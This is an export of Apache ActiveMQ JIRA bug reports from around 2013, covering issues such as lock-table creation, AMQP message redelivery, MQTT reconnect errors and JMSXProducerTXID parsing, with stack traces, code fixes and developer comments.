ActiveMQ creates & initializes ACTIVEMQ_LOCK in wrong database when using separate lock data source,AMQ-4564,12650338,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,tboemker@elynx.com,tboemker@elynx.com,31/May/13 13:25,03/Oct/13 21:43,14/Jul/23 05:43,03/Oct/13 21:43,5.5.1,,,,,5.9.0,,,,,,,0,,,,,,,,,"When configured to use a secondary database for locking, ActiveMQ creates and initializes ACTIVEMQ_LOCK in the primary  database.  It then starts as slave because it can't lock the table in the secondary database.

Workaround: manually copy the ACTIVEMQ_LOCK table from the primary database to the secondary database.",,gtully,tabish,tboemker@elynx.com,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4365,"31/May/13 13:45;tboemker@elynx.com;activemq.log;https://issues.apache.org/jira/secure/attachment/12585613/activemq.log","31/May/13 13:45;tboemker@elynx.com;broker-config.xml;https://issues.apache.org/jira/secure/attachment/12585614/broker-config.xml",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,330665,,,Thu Oct 03 21:43:27 UTC 2013,,,,,,,,,,,"0|i1l1p3:",330999,,,,,,,,,,,,,,,,,,,,,"31/May/13 22:24;tabish;Have you tested this with a later release such as the current 5.8.0?;;;","03/Jun/13 20:57;tboemker@elynx.com;I can't say for sure, and my test environment is shared, so I'm not able to test with 5.8.0 now.;;;","23/Jul/13 19:10;tabish;No test case provided to reproduce this error.  ;;;","03/Oct/13 21:42;gtully;The support for table creation by the jdbc lockers (createTablesOnStartup attribute) from https://issues.apache.org/jira/browse/AMQ-4365 sorts this;;;","03/Oct/13 21:43;gtully;note the new createTablesOnStartup option, which will use the lockerDataSource;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Persisted messages reappear after broker restart when using amqp,AMQ-4563,12650132,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,kearls,kearls,30/May/13 12:21,27/Mar/14 15:34,14/Jul/23 05:43,27/Mar/14 15:34,5.8.0,,,,,5.10.0,5.9.0,,,,,,0,,,,,,,,,"To reproduce this, do the following

1. Start a broker, create a producer using amqp, and send some messages
2. Stop/Start broker
3. Create a consumer to consume messages from step 1.
4. Stop/Start broker
5. Run consumer again.  It will receive the same messages it already received in step 3.

I will attach a unit test which reproduces this.
",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/May/13 12:25;kearls;AMQ-4563.patch;https://issues.apache.org/jira/secure/attachment/12585405/AMQ-4563.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,330459,,,Thu Mar 27 15:34:43 UTC 2014,,,,,,,,,,,"0|i1l0fb:",330793,,,,,,,,,,,,,,,,,,,,,"30/May/13 16:11;tabish;Added your great test updates on trunk, did a few tweaks to make the test to reproduce the same consistently for easier debugging.  ;;;","30/May/13 23:05;tabish;Things will work if the Messages are produced with the ActiveMQ JMS client, however when receiving from the QPid JMS client the message has a MessageID that's not compatible with ActiveMQ so we don't correctly process the Ack.  We need to figure out how to ensure that the MessageId is set to an ActiveMQ compatible version on receive.  ;;;","31/May/13 15:11;chirino;This seems to be KahaDB specific.  The test case passes when run against LevelDB.;;;","31/May/13 15:58;tabish;Yeah, we sort of backed ourselves into a corner by relying on MessageID to be formatted a specific way.  Without the right values in their things like producer audit and such break.  We should probably maintain an original value in the MessageID when and resend that on dispatch as opposed to overwriting the vendor supplied one with out own. ;;;","31/May/13 20:32;tabish;fixed.  Its not ideal to have to set the store version as its not very intuitive but at least now we can support the various use cases;;;","27/Mar/14 15:31;tabish;If the sending client uses a Message ID format that can be parsed into the basic ActiveMQ message id format this bug reappears.  We need to always create our own Message Id and store off the external ID in the new instance as the TextView for later reuse.  ;;;","27/Mar/14 15:34;tabish;Fixed in: da07a11760e18edb52035129495edc97193e3fe3;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
SimplePriorityMessageDispatchChannel.clear() needs to reset size attribute,AMQ-4562,12650104,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tmielke,tmielke,30/May/13 08:34,30/May/13 14:29,14/Jul/23 05:43,30/May/13 14:29,5.8.0,,,,,5.9.0,,,JMS client,,,,0,,,,,,,,,"SimplePriorityMessageDispatchChannel.clear() deletes all prefetched messages but does not reset the size counter. The other method removeAll() does it correctly.

Propose to fix this as follows:

{code:title=SimplePriorityMessageDispatchChannel.java}
    public void clear() {
        synchronized (mutex) {
            for (int i = 0; i < MAX_PRIORITY; i++) {
                lists[i].clear();
            }
	    size = 0;
        }
    }
{code}
",,tabish,tmielke,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,330431,,,Thu May 30 14:29:36 UTC 2013,,,,,,,Patch Available,,,,"0|i1l093:",330765,,,,,,,,,,,,,,,,,,,,,"30/May/13 08:35;tmielke;I hope this fix is obvious as I am not sure yet how to test this in a unit test. 
If I get the ok, I will push the fix without a test.;;;","30/May/13 10:33;tabish;Fix looks fine to me.;;;","30/May/13 14:29;tabish;Fixed on trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Exception from AMQP transport when dispatching Messages from the store.,AMQ-4560,12649722,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,28/May/13 15:03,28/May/13 15:05,14/Jul/23 05:43,28/May/13 15:05,5.8.0,,,,,5.9.0,,,Transport,,,,0,,,,,,,,,"When messages are placed in a Queue and the broker is restarted the AMQP transport will throw the following exception on dispatch of the Message recovered from the store. 

{code}
javax.jms.MessageNotReadableException: Message body is write-only
	at org.apache.activemq.command.ActiveMQBytesMessage.checkWriteOnlyBody(ActiveMQBytesMessage.java:863)
	at org.apache.activemq.command.ActiveMQBytesMessage.initializeReading(ActiveMQBytesMessage.java:868)
	at org.apache.activemq.command.ActiveMQBytesMessage.getBodyLength(ActiveMQBytesMessage.java:190)
	at org.apache.qpid.proton.jms.AMQPNativeOutboundTransformer.transform(AMQPNativeOutboundTransformer.java:63)
	at org.apache.qpid.proton.jms.AutoOutboundTransformer.transform(AutoOutboundTransformer.java:37)
	at org.apache.activemq.transport.amqp.AmqpProtocolConverter$ConsumerContext.pumpOutbound(AmqpProtocolConverter.java:751)
	at org.apache.activemq.transport.amqp.AmqpProtocolConverter$ConsumerContext.onMessageDispatch(AmqpProtocolConverter.java:710)
	at org.apache.activemq.transport.amqp.AmqpProtocolConverter.onActiveMQCommand(AmqpProtocolConverter.java:300)
	at org.apache.activemq.transport.amqp.AmqpTransportFilter.oneway(AmqpTransportFilter.java:64)
	at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1378)
	at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:897)
	at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:943)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:895)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:918)
	at java.lang.Thread.run(Thread.java:680)
{code}",,rgauss,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,330049,,,Tue May 28 15:05:08 UTC 2013,,,,,,,,,,,"0|i1kxwn:",330384,,,,,,,,,,,,,,,,,,,,,"28/May/13 15:05;tabish;Fixed on trunk, needed to set the Message to read-only before we hand off to the transformer. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Minor error in org.apache.activemq.transport.amqp.JMSClientTest,AMQ-4559,12649721,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,kearls,kearls,28/May/13 15:03,28/May/13 15:11,14/Jul/23 05:43,28/May/13 15:11,,,,,,,,,Test Cases,,,,0,,,,,,,,,"There's an assert that works on ""message"" which is the sent version of the message, rather than ""msg"" which is the received message.
",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/May/13 15:04;kearls;AMQ-4559.patch;https://issues.apache.org/jira/secure/attachment/12585036/AMQ-4559.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,330048,,,Tue May 28 15:11:55 UTC 2013,,,,,,,Patch Available,,,,"0|i1kxwf:",330383,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"28/May/13 15:11;tabish;patch applied, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Locking in SimpleCachedLDAPAuthorizationMap can lead to delays in Message dispatch.,AMQ-4555,12649327,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,24/May/13 14:04,24/May/13 14:27,14/Jul/23 05:43,24/May/13 14:27,5.7.0,5.8.0,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"The SimpleCachedLDAPAuthorizationMap attempts to cache the LDAP authentication data; however, the locking used in the update phase can lead the broker to stall message dispatch since every caller that looks up security ACLs will wait until the update completes.  Since we are caching the updates should occur asynchronously and only replace the existing cached values once the update completes.  ",,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,329654,,,Fri May 24 14:27:43 UTC 2013,,,,,,,,,,,"0|i1kvgv:",329989,,,,,,,,,,,,,,,,,,,,,"24/May/13 14:27;tabish;Fixed on trunk. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NumberFormatException when parsing JMSXProducerTXID,AMQ-4554,12649289,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Blocker,Fixed,tabish,nbrys,nbrys,24/May/13 09:39,24/May/13 21:38,14/Jul/23 05:43,24/May/13 21:38,5.5.1,,,,,5.9.0,,,,,,,0,,,,,,,,,"When creating a simple message using ActiveMQ and trying to receive that same message. We get the following stacktrace when trying to retrieve JMSXProducerTXID.

{noformat}
[SEVERE] Thread death for Transacted Thread caused by For input string: ""TX:ID:ID-PC12010.local-59923-1369316134520-2:10:1""
java.lang.NumberFormatException: For input string: ""TX:ID:ID-PC12010.local-59923-1369316134520-2:10:1""
    at java.lang.NumberFormatException.forInputString(NumberFormatException.java:48)
    at java.lang.Integer.parseInt(Integer.java:449)
    at java.lang.Integer.<init>(Integer.java:660)
    at org.apache.activemq.filter.PropertyExpression$14.evaluate(PropertyExpression.java:147)
    at org.apache.activemq.filter.PropertyExpression.evaluate(PropertyExpression.java:194)
    at org.apache.activemq.command.ActiveMQMessage.getObjectProperty(ActiveMQMessage.java:509)
    at org.apache.activemq.command.ActiveMQMessage.getStringProperty(ActiveMQMessage.java:604)
    at com.id.scriptura.documentflow.standard.impl.jms.JMSMessageConsumerStep$TransactedMessageReceiver.run(Unknown Source)
    at java.lang.Thread.run(Thread.java:680)
{noformat}

This property is set by ActiveMQ and NOT by our application. The code for retrieving is like this:

msg.getStringProperty(JMSXProducerTXID)",Mac / Windows,nbrys,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,329616,,,Fri May 24 21:38:29 UTC 2013,,,,,,,,,,,"0|i1kv8f:",329951,,,,,,,,,,,,,,,,,,,,,"24/May/13 09:44;nbrys;The code from activeMQ

{noformat}
  JMS_PROPERTY_EXPRESSIONS.put(""JMSXProducerTXID"", new SubExpression() {
 
           public Object evaluate(Message message) {
               TransactionId txId = message.getOriginalTransactionId();
               if (txId == null) {
                   txId = message.getTransactionId();
               }
               if (txId == null) {
                   return null;
               }
               return new Integer(txId.toString());
           }
       });
{noformat}

JMS Spec:

MSXProducerTXID String Provider on
Send
The transaction identifier of the
transaction within which this
message was produced

Please see: http://docs.oracle.com/cd/E19957-01/816-5904-10/816-5904-10.pdf page 36;;;","24/May/13 10:17;tabish;Recommend you create a unit test that reproduces your issue, also you should try testing a later release, 5.5.1 is a bit old these days. ;;;","24/May/13 10:22;nbrys;Hi [~tabish121], the version doesn't mather. The source code is still the same (See my previous comment... This source is from there current release).

The test case is rather easy.. Just send a message with activeMQ and receive message with ActiveMQ where you request the property...

Found this also:

{noformat}
ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(ActiveMQConnection.DEFAULT_USER, 
ActiveMQConnection.DEFAULT_PASSWORD, ActiveMQConnection.DEFAULT_BROKER_URL)
Connection connection = connectionFactory.createConnection();	
connection.start();
Session producerSession = connection.createSession(true, Session.SESSION_TRANSACTED);
MessageProducer producer = producerSession.createProducer(producerSession.createQueue(""myQueue""));
TextMessage producerMessage = producerSession.createTextMessage(""Test Message"");
producer.send(producerMessage);
producer.close();
producerSession.commit();
producerSession.close();
Session consumerSession = connection.createSession(true, Session.SESSION_TRANSACTED);
MessageConsumer consumer = consumerSession.createConsumer(consumerSession.createQueue(""myQueue""));
Message consumerMessage = consumer.receive(1000);
System.out.println(consumerMessage.getStringProperty(""JMSXProducerTXID""));
consumer.close();
consumerSession.commit();
consumerSession.close();
connection.close();{noformat};;;","24/May/13 10:27;nbrys;See fisheye:
https://fisheye6.atlassian.com/browse/~br=trunk/activemq/trunk/activemq-client/src/main/java/org/apache/activemq/filter/PropertyExpression.java?r=1483600;;;","24/May/13 21:38;tabish;Fixed on trunk, test added to protect the fix;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KahaDB can recover old inflight XA transactions that keep logs from being cleaned up.,AMQ-4548,12648751,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,21/May/13 22:17,21/May/13 22:26,14/Jul/23 05:43,21/May/13 22:26,5.8.0,,,,,5.9.0,,,Message Store,,,,0,,,,,,,,,When doing a recovery its possible for KahaDB to recover XA transactions that were previously prepared and committed and leave them in a transient in-flight state.  This causes the GC cycle to hold old log files when they could otherwise be deleted.  These in-flight transactions can be discarded once recovery compeletes. ,,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,329081,,,Tue May 21 22:26:14 UTC 2013,,,,,,,,,,,"0|i1krzj:",329423,,,,,,,,,,,,,,,,,,,,,"21/May/13 22:26;tabish;Fixed on trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cant send MQTT message to AMQP endpoints,AMQ-4544,12648308,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,18/May/13 16:26,18/May/13 16:40,14/Jul/23 05:43,18/May/13 16:40,,,,,,5.9.0,,,MQTT,,,,0,,,,,,,,,Seems there is error converting JMS messages to AMQP messages.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,328664,,,Sat May 18 16:40:51 UTC 2013,,,,,,,,,,,"0|i1kpfb:",329007,,,,,,,,,,,,,,,,,,,,,"18/May/13 16:40;chirino;Fixed;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Client already connected error when connecting to MQTT server a second time ,AMQ-4543,12648290,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,popeye,popeye,18/May/13 08:14,08/Dec/14 18:37,14/Jul/23 05:43,18/May/13 19:29,5.7.0,,,,,5.9.0,,,MQTT,,,,0,,,,,,,,,"I built client that is connecting to Apache MQ set for mqtt. 

Now on first try client establishes the connection with client id = test1, sends message and closes connection

         if(!client.isConnected()){
			client.connect(conOpt);
        }
        MqttTopic topic = client.getTopic(topicName);

        MqttMessage message = new MqttMessage(payload);
    	message.setQos(qos);
    	MqttDeliveryToken token = topic.publish(message);
    	token.waitForCompletion();
    	client.disconnect();


Then when again I run client it fails on connect ... I can see log in apache mq log:

 WARN | Transport Connection to: tcp://127.0.0.1:57354 failed: java.io.IOExcepti
on: Broker: localhost - Client: test1 already connected from tcp://127.0.0.1:57
330

in connection options I have set only setCleanSession(true). Paho client I have downloaded from site as stable version.

I have first tried to raise an issue with the Eclipse Paho project (https://bugs.eclipse.org/bugs/show_bug.cgi?id=408105) and after investigation their team came to conclusion that this is not on clinet side",Win 2008,JamesRSemple,kilmarnock,popeye,salex89,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5040,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,328646,,,Mon Dec 08 18:37:31 UTC 2014,,,,,,,,,,,"0|i1kpbb:",328989,,,,,,,,,,,,,,,,,,,,,"18/May/13 10:33;tabish;Have you tried a later release such a v5.8.0 or a SNAPSHOT of 5.9?  There's already bee a lot of MQTT fixes since 5.7 so this is possibly already taken care of. ;;;","18/May/13 19:29;popeye;Hi Timothy,

I tried against SNAPSHOT of 5.9 and it seems to be working.

Thanks,
Dorde.;;;","06/Aug/14 11:27;kilmarnock;Hi!

I tried against 5.9.1 and the error is there.

What is the point of throwing an exception if a client tries to connect?

Yours
Felix;;;","06/Aug/14 11:30;kilmarnock;I am using owntracks.org (git version) as a client which in turn uses paho mqtt. Version is unknown. A ""workaround"" is a restart of activeMQ.;;;","08/Dec/14 18:37;JamesRSemple;It looks to me like this bug has reappeared in ActiveMQ 5.10.0.  Can someone at ActiveMQ do a quick regression test?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broken javax.jms.Message.getObjectProperty(String),AMQ-4542,12648212,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,aldib,aldib,17/May/13 16:59,28/May/13 17:43,14/Jul/23 05:43,28/May/13 17:43,5.8.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"The implementation provided by ActiveMQ of javax.jms.Message.getObjectProperty(String) does not return a value when the property is JMSXUserID.

This causes a null pointer exception in org.apache.activemq.web.MessageServlet.setResponseHeaders as message.getObjectProperty(name).toString() is used within the loop.

Using javax.jms.Message.getStringProperty(String) solves the problem.

To reproduce, try to consume a message via the REST interface when the broker is configured with populateJMSXUserID=""true"" and       useAuthenticatedPrincipalForJMSXUserID=""true"".

",,aldib,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,328568,,,Tue May 28 17:43:23 UTC 2013,,,,,,,,,,,"0|i1kou7:",328912,,,,,,,,,,,,,,,,,,,,,"17/May/13 19:30;tabish;You can create a unit test for this by adding something to activemq-web-demo in RestTest.java;;;","17/May/13 19:32;tabish;You should also try out a 5.9-SNAPSHOT as its quite possible this is already fixed. ;;;","28/May/13 17:43;tabish;Fixed on trunk. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"The activemq-admin script cannot connect to the local process , can not get the jmx url",AMQ-4541,12648098,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,,hengyunabc,hengyunabc,17/May/13 01:46,26/Aug/13 18:35,14/Jul/23 05:43,26/Aug/13 18:35,5.8.0,,,,,5.9.0,,,JMX,,,,0,jmx,,,,,,,,"""./activemq list "" can work.
""./activemq-admin list"" can not work.

It seems that a bug of jdk.
see here: http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=6649594

To fix it: just remove this:
{code}
 -Djava.io.tmpdir=""${ACTIVEMQ_TMP}"" 
{code}","java version ""1.7.0_21""
Java(TM) SE Runtime Environment (build 1.7.0_21-b11)
Java HotSpot(TM) 64-Bit Server VM (build 23.21-b01, mixed mode)",hengyunabc,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3789,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,328454,,,Mon Aug 26 18:35:01 UTC 2013,,,,,,,Patch Available,,,,"0|i1ko4v:",328798,,,,,,,,,,,,,,,,,,,,,"26/Aug/13 18:35;tabish;Fixed on trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-perftest broken in 5.8.0,AMQ-4537,12647735,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,ceposta,nickspacek,nickspacek,15/May/13 12:46,15/May/13 16:30,14/Jul/23 05:43,15/May/13 16:30,5.8.0,,,,,5.9.0,,,Performance Test,,,,0,,,,,,,,,"I tried setting up my own Maven project to do some ActiveMQ load tests and also used the code at http://svn.apache.org/repos/asf/activemq/sandbox/activemq-perftest/. Both give me the same error below when I execute: mvn activemq-perf:broker -Durl=broker:tcp://localhost:61616

The double-var-encoded string looks strange. I also end up with a folder in the project directory: ${${project.build.directory}}.

I am able to run other Maven plugins in the project and other local projects just fine.

java.net.URISyntaxException: Illegal character in path at index 1: ${${url}}
        at java.net.URI$Parser.fail(URI.java:2829)
        at java.net.URI$Parser.checkChars(URI.java:3002)
        at java.net.URI$Parser.parseHierarchical(URI.java:3086)
        at java.net.URI$Parser.parse(URI.java:3044)
        at java.net.URI.<init>(URI.java:595)
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:95)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:150)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:104)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:601)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:262)
        at org.apache.activemq.console.Main.main(Main.java:115)
        at org.apache.activemq.maven.ServerMojo.execute(ServerMojo.java:108)
        at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:101)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:209)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)
        at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:84)
        at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:59)
